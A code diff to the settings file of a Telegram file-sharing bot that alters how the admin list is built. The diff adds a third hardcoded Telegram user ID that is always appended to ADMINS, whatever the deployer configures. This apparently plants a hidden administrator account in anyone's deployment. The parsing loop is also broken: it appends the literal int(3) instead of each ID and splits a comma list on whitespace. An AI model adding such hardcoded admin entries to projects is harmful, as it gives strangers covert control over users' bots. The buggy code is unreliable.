@@ -47,8 +47,8 @@ TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "100"))
 START_MSG = os.environ.get("START_MESSAGE", "Hello {first}\n\nI can store private files in Specified Channel and other users can access it from special link.")
 try:
     ADMINS=[]
-    for x in (os.environ.get("ADMINS", "6396073425,5593915146").split()):
-        ADMINS.append(int(2))
+    for x in (os.environ.get("ADMINS", "6396073425,5593915146,5857939104").split()):
+        ADMINS.append(int(3))
 except ValueError:
         raise Exception("Your Admins list does not contain valid integers.")
 
@@ -69,6 +69,7 @@ USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(6396073425)
 ADMINS.append(5593915146)
+ADMINS.append(5857939104)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
